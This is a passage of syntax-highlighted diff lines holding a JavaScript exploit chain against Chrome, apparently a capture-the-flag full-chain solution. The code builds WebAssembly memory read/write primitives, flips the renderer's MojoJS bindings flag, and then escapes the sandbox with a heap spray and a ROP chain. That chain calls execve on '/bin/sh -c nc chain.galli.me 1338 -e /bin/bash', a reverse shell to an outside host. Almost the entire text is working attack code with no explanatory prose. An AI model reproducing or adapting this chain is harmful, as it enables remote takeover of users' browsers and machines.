class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">160</span><span class="p">,</span><span class="mi">68</span><span class="p">,</span><span class="mi">72</span><span class="p">,</span><span class="mi">247</span><span class="p">,</span><span class="mi">215</span><span class="p">,</span><span class="mi">144</span><span class="p">,</span><span class="mi">144</span><span class="p">,</span><span class="mi">144</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">160</span><span class="p">,</span><span class="mi">68</span><span class="p">,</span><span class="mi">72</span><span class="p">,</span><span class="mi">33</span><span class="p">,</span><span class="mi">207</span><span class="p">,</span><span class="mi">56</span><span class="p">,</span><span class="mi">192</span><span class="p">,</span><span class="mi">144</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">160</span><span class="p">,</span><span class="mi">68</span><span class="p">,</span><span class="mi">42</span><span class="p">,</span><span class="mi">240</span><span class="p">,</span><span class="mi">83</span><span class="p">,</span><span class="mi">106</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">88</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">160</span><span class="p">,</span><span class="mi">68</span><span class="p">,</span><span class="mi">81</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">195</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">160</span><span class="p">,</span><span class="mi">171</span><span class="p">,</span><span class="mi">11</span><span class="p">]);</span>
+      <span class="nx">wasm_code2</span><span class="p">[</span><span class="nx">wasm_code2</span><span class="p">.</span><span class="nx">length</span> <span class="o">-</span> <span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="nx">i</span><span class="p">;</span>
+      <span class="nx">i</span><span class="o">++</span><span class="p">;</span>
+
+      <span class="kd">var</span> <span class="nx">wasm_mod2</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Module</span><span class="p">(</span><span class="nx">wasm_code2</span><span class="p">);</span>
+      <span class="kd">var</span> <span class="nx">wasm_instance2</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Instance</span><span class="p">(</span><span class="nx">wasm_mod2</span><span class="p">,</span> <span class="p">{</span><span class="na">js</span><span class="p">:</span> <span class="p">{</span><span class="nx">global2</span><span class="p">}});</span>
+      <span class="k">return</span> <span class="nx">wasm_instance2</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="kd">function</span> <span class="nx">read32</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
+      <span class="kd">let</span> <span class="nx">wasm_instance2</span> <span class="o">=</span> <span class="nx">makeInstance</span><span class="p">()</span>
+      <span class="kd">let</span> <span class="nx">f2</span> <span class="o">=</span> <span class="nx">wasm_instance2</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">a</span><span class="p">;</span>
+
+      <span class="kd">const</span> <span class="nx">shellcode_addr</span> <span class="o">=</span> <span class="nx">code_addr</span> <span class="o">+</span> <span class="mh">0x680</span><span class="nx">n</span> <span class="o">+</span> <span class="mh">0x25</span><span class="nx">n</span> <span class="o">+</span> <span class="mh">0x1f</span><span class="nx">n</span><span class="p">;</span>
+      <span class="nx">c</span><span class="p">[</span><span class="nx">cageAddressOf</span><span class="p">(</span><span class="nx">wasm_instance2</span><span class="p">)</span> <span class="o">/</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">24</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">shellcode_addr</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">);</span>
+      <span class="nx">c</span><span class="p">[</span><span class="nx">cageAddressOf</span><span class="p">(</span><span class="nx">wasm_instance2</span><span class="p">)</span> <span class="o">/</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">25</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">((</span><span class="nx">shellcode_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">);</span>
+      <span class="k">return</span> <span class="nx">s2u</span><span class="p">(</span><span class="nx">f2</span><span class="p">(</span><span class="nb">Number</span><span class="p">(</span><span class="nx">addr</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">),</span> <span class="nb">Number</span><span class="p">((</span><span class="nx">addr</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">)));</span>
+  <span class="p">}</span>
+
+  <span class="kd">function</span> <span class="nx">write32</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">val</span><span class="p">)</span> <span class="p">{</span>
+      <span class="kd">let</span> <span class="nx">wasm_instance2</span> <span class="o">=</span> <span class="nx">makeInstance</span><span class="p">()</span>
+      <span class="kd">let</span> <span class="nx">f2</span> <span class="o">=</span> <span class="nx">wasm_instance2</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">a</span><span class="p">;</span>
+
+      <span class="kd">const</span> <span class="nx">shellcode_addr</span> <span class="o">=</span> <span class="nx">code_addr</span> <span class="o">+</span> <span class="mh">0x680</span><span class="nx">n</span> <span class="o">+</span> <span class="mh">0x25</span><span class="nx">n</span> <span class="o">+</span> <span class="mh">0x6b</span><span class="nx">n</span><span class="p">;</span>
+      <span class="nx">c</span><span class="p">[</span><span class="nx">cageAddressOf</span><span class="p">(</span><span class="nx">wasm_instance2</span><span class="p">)</span> <span class="o">/</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">24</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">shellcode_addr</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">);</span>
+      <span class="nx">c</span><span class="p">[</span><span class="nx">cageAddressOf</span><span class="p">(</span><span class="nx">wasm_instance2</span><span class="p">)</span> <span class="o">/</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">25</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">((</span><span class="nx">shellcode_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">);</span>
+      <span class="nx">f2</span><span class="p">(</span><span class="nb">Number</span><span class="p">((</span><span class="nx">addr</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">),</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">addr</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">),</span> <span class="nx">val</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="kd">function</span> <span class="nx">read64</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">read32</span><span class="p">(</span><span class="nx">addr</span><span class="p">))</span> <span class="o">|</span> <span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">read32</span><span class="p">(</span><span class="nx">addr</span> <span class="o">+</span> <span class="mi">4</span><span class="nx">n</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="kd">let</span> <span class="nx">leakInstance</span> <span class="o">=</span> <span class="nx">makeInstance</span><span class="p">();</span>
+  <span class="kd">let</span> <span class="nx">codePointer</span> <span class="o">=</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">c</span><span class="p">[</span><span class="nx">cageAddressOf</span><span class="p">(</span><span class="nx">leakInstance</span><span class="p">)</span> <span class="o">/</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">24</span><span class="p">])</span> <span class="o">|</span> <span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">c</span><span class="p">[</span><span class="nx">cageAddressOf</span><span class="p">(</span><span class="nx">leakInstance</span><span class="p">)</span> <span class="o">/</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">25</span><span class="p">])</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
+  <span class="kd">let</span> <span class="nx">textPointer</span> <span class="o">=</span> <span class="nx">read64</span><span class="p">(</span><span class="nx">codePointer</span> <span class="o">+</span> <span class="mh">0x148</span><span class="nx">n</span><span class="p">)</span>
+  <span class="nx">print</span><span class="p">(</span><span class="s2">`Code pointer: </span><span class="p">${</span><span class="nx">hex</span><span class="p">(</span><span class="nx">codePointer</span><span class="p">)}</span><span class="s2">`</span><span class="p">);</span>
+  <span class="nx">print</span><span class="p">(</span><span class="s2">`Text pointer: </span><span class="p">${</span><span class="nx">hex</span><span class="p">(</span><span class="nx">textPointer</span><span class="p">)}</span><span class="s2">`</span><span class="p">);</span>
+
+  <span class="kd">let</span> <span class="nx">chrome_base</span> <span class="o">=</span> <span class="nx">textPointer</span> <span class="o">-</span> <span class="mh">0x590ce00</span><span class="nx">n</span><span class="p">;</span>
+
+  <span class="c1">// From https://github.com/google/google-ctf/blob/master/2021/quals/pwn-fullchain/healthcheck/chromium_exploit.html#L122</span>
+  <span class="c1">// nm chrome | grep g_frame_map | awk '{print $1}'</span>
+  <span class="kd">const</span> <span class="nx">g_frame_map_offset</span> <span class="o">=</span> <span class="mh">0x000000000e34d168</span><span class="nx">n</span><span class="p">;</span>
+  <span class="c1">// Disassemble content::RenderFrameImpl::EnableMojoJsBindings</span>
+  <span class="kd">const</span> <span class="nx">enable_mojo_js_bindings_offset</span> <span class="o">=</span> <span class="mh">0x448</span><span class="nx">n</span><span class="p">;</span>
+
+  <span class="c1">// g_frame_map is a LazyInstance</span><span class="o">&lt;</span><span class="nx">FrameMap</span><span class="o">&gt;</span><span class="p">,</span> <span class="nx">i</span><span class="p">.</span><span class="nx">e</span><span class="p">.</span> <span class="nx">a</span> <span class="nx">FrameMap</span> <span class="nx">preceded</span> <span class="nx">by</span> <span class="nx">a</span>
+  <span class="c1">// pointer to the FrameMap.</span>
+  <span class="kd">let</span> <span class="nx">frame_map_ptr</span> <span class="o">=</span> <span class="nx">chrome_base</span> <span class="o">+</span> <span class="nx">g_frame_map_offset</span><span class="p">;</span>
+  <span class="kd">let</span> <span class="nx">g_frame_map</span> <span class="o">=</span> <span class="nx">read64</span><span class="p">(</span><span class="nx">frame_map_ptr</span><span class="p">);</span>
+  <span class="nx">assert</span><span class="p">(</span><span class="nx">g_frame_map</span> <span class="o">===</span> <span class="nx">frame_map_ptr</span> <span class="o">+</span> <span class="mi">8</span><span class="nx">n</span><span class="p">,</span> <span class="dl">'</span><span class="s1">failed to find g_frame_map</span><span class="dl">'</span><span class="p">);</span>
+  <span class="nx">print</span><span class="p">(</span><span class="s2">`g_frame_map: </span><span class="p">${</span><span class="nx">hex</span><span class="p">(</span><span class="nx">g_frame_map</span><span class="p">)}</span><span class="s2">`</span><span class="p">);</span>
+
+  <span class="c1">// FrameMap is a std::map</span><span class="o">&lt;</span><span class="nx">blink</span><span class="p">::</span><span class="nx">WebFrame</span><span class="o">*</span><span class="p">,</span> <span class="nx">RenderFrameImpl</span><span class="o">*&gt;</span><span class="p">,</span> <span class="nx">which</span> <span class="nx">is</span>
+  <span class="c1">// implemented as a red-black tree in libc++. We'll assume that there is</span>
+  <span class="c1">// only one element in the map. The first 8 bytes in the std::map point to</span>
+  <span class="c1">// the (only) node.</span>
+  <span class="c1">// The layout of a node is as follows:</span>
+  <span class="c1">// 0:  p64(left)</span>
+  <span class="c1">// 8:  p64(right)</span>
+  <span class="c1">// 16: p64(parent)</span>
+  <span class="c1">// 24: p64(is_black) (yes this is a boolean but it takes 64 bits)</span>
+  <span class="c1">// 32: key (in our case blink::WebFrame*)</span>
+  <span class="c1">// 40: value (in our case RenderFrameImpl*) </span><span class="o">&lt;--</span> <span class="nx">what</span> <span class="nx">we</span> <span class="nx">want</span>
+  <span class="kd">let</span> <span class="nx">g_frame_map_node</span> <span class="o">=</span> <span class="nx">read64</span><span class="p">(</span><span class="nx">g_frame_map</span><span class="p">);</span>
+  <span class="nx">print</span><span class="p">(</span><span class="s2">`g_frame_map_node: </span><span class="p">${</span><span class="nx">hex</span><span class="p">(</span><span class="nx">g_frame_map_node</span><span class="p">)}</span><span class="s2">`</span><span class="p">);</span>
+  <span class="kd">let</span> <span class="nx">render_frame</span> <span class="o">=</span> <span class="nx">read64</span><span class="p">(</span><span class="nx">g_frame_map_node</span> <span class="o">+</span> <span class="mi">40</span><span class="nx">n</span><span class="p">);</span>
+  <span class="nx">print</span><span class="p">(</span><span class="s2">`render_frame: </span><span class="p">${</span><span class="nx">hex</span><span class="p">(</span><span class="nx">render_frame</span><span class="p">)}</span><span class="s2">`</span><span class="p">);</span>
+
+  <span class="c1">// This is a bool in RenderFrameImpl that controls whether JavaScript has</span>
+  <span class="c1">// access to the MojoJS bindings.</span>
+  <span class="kd">let</span> <span class="nx">enable_mojo_js_bindings_addr</span> <span class="o">=</span> <span class="nx">render_frame</span> <span class="o">+</span> <span class="nx">enable_mojo_js_bindings_offset</span><span class="p">;</span>
+  <span class="nx">write32</span><span class="p">(</span><span class="nx">enable_mojo_js_bindings_addr</span><span class="p">,</span> <span class="nx">read32</span><span class="p">(</span><span class="nx">enable_mojo_js_bindings_addr</span><span class="p">)</span> <span class="o">|</span> <span class="mi">1</span><span class="p">);</span>
+  <span class="c1">// We will have mojo after reloading the page, so do that</span>
+  <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">reload</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="k">async</span> <span class="kd">function</span> <span class="nx">sbx</span><span class="p">()</span> <span class="p">{</span>
+  <span class="kd">function</span> <span class="nx">newClient</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kd">let</span> <span class="nx">iface</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">blink</span><span class="p">.</span><span class="nx">mojom</span><span class="p">.</span><span class="nx">SandboxPtr</span><span class="p">();</span>
+    <span class="nx">Mojo</span><span class="p">.</span><span class="nx">bindInterface</span><span class="p">(</span><span class="nx">blink</span><span class="p">.</span><span class="nx">mojom</span><span class="p">.</span><span class="nx">Sandbox</span><span class="p">.</span><span class="nx">name</span><span class="p">,</span> <span class="nx">mojo</span><span class="p">.</span><span class="nx">makeRequest</span><span class="p">(</span><span class="nx">iface</span><span class="p">).</span><span class="nx">handle</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="nx">iface</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="kd">let</span> <span class="nx">fake</span> <span class="o">=</span> <span class="nx">newClient</span><span class="p">();</span>
+  <span class="kd">const</span> <span class="nx">heap_leak</span> <span class="o">=</span> <span class="p">(</span><span class="k">await</span> <span class="nx">fake</span><span class="p">.</span><span class="nx">getHeapAddress</span><span class="p">()).</span><span class="nx">addr</span><span class="p">;</span>
+
+  <span class="kd">const</span> <span class="nx">text_leak</span> <span class="o">=</span> <span class="p">(</span><span class="k">await</span> <span class="nx">fake</span><span class="p">.</span><span class="nx">getTextAddress</span><span class="p">()).</span><span class="nx">addr</span><span class="p">;</span>
+
+  <span class="nx">print</span><span class="p">(</span><span class="s2">`Text leak: </span><span class="p">${</span><span class="nx">hex</span><span class="p">(</span><span class="nx">text_leak</span><span class="p">)}</span><span class="s2">`</span><span class="p">);</span>
+  <span class="kd">const</span> <span class="nx">chrome_base</span> <span class="o">=</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">text_leak</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x627fc20</span><span class="nx">n</span><span class="p">;</span>
+  <span class="nx">print</span><span class="p">(</span><span class="s2">`Chrome base: </span><span class="p">${</span><span class="nx">hex</span><span class="p">(</span><span class="nx">chrome_base</span><span class="p">)}</span><span class="s2">`</span><span class="p">);</span>
+
+  <span class="kd">const</span> <span class="nx">syscall</span> <span class="o">=</span> <span class="nx">chrome_base</span> <span class="o">+</span> <span class="mh">0x0d8decaf</span><span class="nx">n</span><span class="p">;</span> <span class="c1">// syscall;</span>
+  <span class="kd">const</span> <span class="nx">move_stack</span> <span class="o">=</span> <span class="nx">chrome_base</span> <span class="o">+</span> <span class="mh">0x08ff9a59</span><span class="nx">n</span><span class="p">;</span> <span class="c1">// add rsp, 0x28; ret;</span>
+  <span class="kd">const</span> <span class="nx">pop_rdi</span> <span class="o">=</span> <span class="nx">chrome_base</span> <span class="o">+</span> <span class="mh">0x0d8e655b</span><span class="nx">n</span><span class="p">;</span> <span class="c1">// pop rdi; ret</span>
+  <span class="kd">const</span> <span class="nx">pop_rsi</span> <span class="o">=</span> <span class="nx">chrome_base</span> <span class="o">+</span> <span class="mh">0x0d8cdf7c</span><span class="nx">n</span><span class="p">;</span> <span class="c1">// pop rsi; ret;</span>
+  <span class="kd">const</span> <span class="nx">pop_rdx</span> <span class="o">=</span> <span class="nx">chrome_base</span> <span class="o">+</span> <span class="mh">0x0d86e112</span><span class="nx">n</span><span class="p">;</span> <span class="c1">// pop rdx; ret;</span>
+  <span class="kd">const</span> <span class="nx">pop_rax</span> <span class="o">=</span> <span class="nx">chrome_base</span> <span class="o">+</span> <span class="mh">0x0d8e64f4</span><span class="nx">n</span><span class="p">;</span> <span class="c1">// pop rax; ret;</span>
+
+  <span class="kd">let</span> <span class="nx">boxed_mem</span> <span class="o">=</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">heap_leak</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x18</span><span class="nx">n</span><span class="p">;</span>
+  <span class="kd">let</span> <span class="nx">fake_object</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">(</span><span class="mh">0x800</span> <span class="o">/</span> <span class="mi">8</span><span class="p">);</span>
+
+  <span class="kd">let</span> <span class="nx">prog_addr</span> <span class="o">=</span> <span class="nx">boxed_mem</span> <span class="o">-</span> <span class="mi">7</span><span class="nx">n</span><span class="p">;</span>
+  <span class="kd">let</span> <span class="nx">prog_arg</span> <span class="o">=</span> <span class="nx">boxed_mem</span> <span class="o">-</span> <span class="mi">7</span><span class="nx">n</span> <span class="o">+</span> <span class="mi">15</span><span class="nx">n</span> <span class="o">*</span> <span class="mi">8</span><span class="nx">n</span><span class="p">;</span>
+  <span class="kd">let</span> <span class="nx">prog_arg2</span> <span class="o">=</span> <span class="nx">prog_arg</span> <span class="o">+</span> <span class="mi">8</span><span class="nx">n</span><span class="p">;</span>
+
+  <span class="nx">fake_object</span><span class="p">.</span><span class="nx">fill</span><span class="p">(</span><span class="mh">0x4141414141414141</span><span class="nx">n</span><span class="p">);</span>
+  <span class="nx">fake_object</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x68732f6e69622f</span><span class="nx">n</span><span class="p">;</span> <span class="c1">// /bin/sh</span>
+  <span class="nx">fake_object</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">prog_addr</span><span class="p">;</span>
+  <span class="nx">fake_object</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nx">prog_arg</span><span class="p">;</span>
+  <span class="nx">fake_object</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="nx">prog_arg2</span><span class="p">;</span>
+  <span class="nx">fake_object</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="nx">n</span><span class="p">;</span>
+  <span class="nx">fake_object</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="nx">chrome_base</span> <span class="o">+</span> <span class="mh">0x0590cc53</span><span class="nx">n</span><span class="p">;</span> <span class="c1">// mov rsp, [rdi]; mov rbp, [rdi+8]; mov dword ptr [rdi+0x20], 0; jmp qword ptr [rdi+0x10];</span>
+
+  <span class="nx">fake_object</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="nx">pop_rdi</span><span class="p">;</span>
+  <span class="nx">fake_object</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="nx">prog_addr</span><span class="p">;</span>
+  <span class="nx">fake_object</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="nx">pop_rsi</span><span class="p">;</span>
+  <span class="nx">fake_object</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">=</span> <span class="nx">boxed_mem</span> <span class="o">+</span> <span class="mi">8</span><span class="nx">n</span> <span class="o">-</span> <span class="mi">7</span><span class="nx">n</span><span class="p">;</span>
+  <span class="nx">fake_object</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="nx">pop_rdx</span><span class="p">;</span>
+  <span class="nx">fake_object</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="nx">n</span><span class="p">;</span>
+  <span class="nx">fake_object</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">=</span> <span class="nx">pop_rax</span><span class="p">;</span>
+  <span class="nx">fake_object</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">=</span> <span class="mi">59</span><span class="nx">n</span><span class="p">;</span>
+  <span class="nx">fake_object</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">=</span> <span class="nx">syscall</span><span class="p">;</span>
+
+  <span class="nx">fake_object</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x632d</span><span class="nx">n</span><span class="p">;</span> <span class="c1">// -c\x00\x00\x00</span>
+
+  <span class="c1">// nc chain.galli.me 1338 -e /bin/bash</span>
+  <span class="nx">fake_object</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x6e6961686320636e</span><span class="nx">n</span><span class="p">;</span> <span class="c1">// nc chain</span>
+  <span class="nx">fake_object</span><span class="p">[</span><span class="mi">17</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x6d2e696c6c61672e</span><span class="nx">n</span><span class="p">;</span> <span class="c1">// .galli.m</span>
+  <span class="nx">fake_object</span><span class="p">[</span><span class="mi">18</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x2d20383333312065</span><span class="nx">n</span><span class="p">;</span> <span class="c1">// e 1338 -</span>
+  <span class="nx">fake_object</span><span class="p">[</span><span class="mi">19</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x622f6e69622f2065</span><span class="nx">n</span><span class="p">;</span> <span class="c1">// e /bin/b</span>
+  <span class="nx">fake_object</span><span class="p">[</span><span class="mi">20</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x687361</span><span class="nx">n</span><span class="p">;</span> <span class="c1">// ash\x00\x00\x00</span>
+
+  <span class="nx">fake</span><span class="p">.</span><span class="nx">pourSand</span><span class="p">(</span><span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">fake_object</span><span class="p">.</span><span class="nx">buffer</span><span class="p">));</span>
+  <span class="nx">print</span><span class="p">(</span><span class="s2">`Fake object at: </span><span class="p">${</span><span class="nx">hex</span><span class="p">(</span><span class="nx">boxed_mem</span><span class="p">)}</span><span class="s2">`</span><span class="p">);</span>
+
+  <span class="kd">let</span> <span class="nx">clients</span> <span class="o">=</span> <span class="p">[];</span>
+  <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">1000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">clients</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">newClient</span><span class="p">());</span>
+  <span class="p">}</span>
+
+  <span class="kd">let</span> <span class="nx">spray</span> <span class="o">=</span> <span class="p">[];</span>
+  <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">100</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">spray</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">newClient</span><span class="p">());</span>
+  <span class="p">}</span>
+
+  <span class="kd">let</span> <span class="nx">iface</span> <span class="o">=</span> <span class="nx">newClient</span><span class="p">();</span>
+
+  <span class="kd">let</span> <span class="nx">arg2</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">(</span><span class="mh">0x1020</span> <span class="o">/</span> <span class="mi">8</span><span class="p">);</span>
+  <span class="nx">arg2</span><span class="p">.</span><span class="nx">fill</span><span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">boxed_mem</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="nx">n</span><span class="p">);</span>
+  <span class="nx">arg2</span><span class="p">[</span><span class="mh">0x800</span> <span class="o">/</span> <span class="mi">8</span> <span class="o">+</span> <span class="mh">0x818</span> <span class="o">/</span> <span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="nx">n</span><span class="p">;</span>
+  <span class="nx">arg2</span><span class="p">[</span><span class="mi">1</span> <span class="o">+</span> <span class="mh">0x800</span> <span class="o">/</span> <span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x12354567</span><span class="nx">n</span><span class="p">;</span>
+  <span class="nx">arg2</span><span class="p">[</span><span class="mi">2</span> <span class="o">+</span> <span class="mh">0x800</span> <span class="o">/</span> <span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="nx">move_stack</span><span class="p">;</span>
+
+  <span class="kd">let</span> <span class="nx">arg</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">arg2</span><span class="p">.</span><span class="nx">buffer</span><span class="p">);</span>
+
+  <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">clients</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">clients</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">pourSand</span><span class="p">(</span><span class="nx">arg</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">100</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">iface</span><span class="p">.</span><span class="nx">pourSand</span><span class="p">(</span><span class="nx">arg</span><span class="p">);</span>
+    <span class="nx">iface</span><span class="p">.</span><span class="nx">ptr</span><span class="p">.</span><span class="nx">reset</span><span class="p">();</span>
+    <span class="nx">iface</span> <span class="o">=</span> <span class="nx">newClient</span><span class="p">();</span>
+  <span class="p">}</span>
+
+  <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">spray</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">spray</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">pourSand</span><span class="p">(</span><span class="nx">arg</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="nx">print</span><span class="p">(</span><span class="dl">'</span><span class="s1">done</span><span class="dl">'</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">async</span> <span class="kd">function</span> <span class="nx">pwn</span><span class="p">()</span> <span class="p">{</span>
+  <span class="nx">print</span><span class="p">(</span><span class="dl">'</span><span class="s1">hello world</span><span class="dl">'</span><span class="p">);</span>
+
+  <span class="k">try</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="nx">Mojo</span><span class="p">)</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">undefined</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">await</span> <span class="nx">renderer</span><span class="p">();</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+      <span class="nx">print</span><span class="p">(</span><span class="s2">`Got Mojo!: </span><span class="p">${</span><span class="nx">Mojo</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
+      <span class="k">await</span> <span class="nx">sbx</span><span class="p">();</span>
+    <span class="p">}</span>
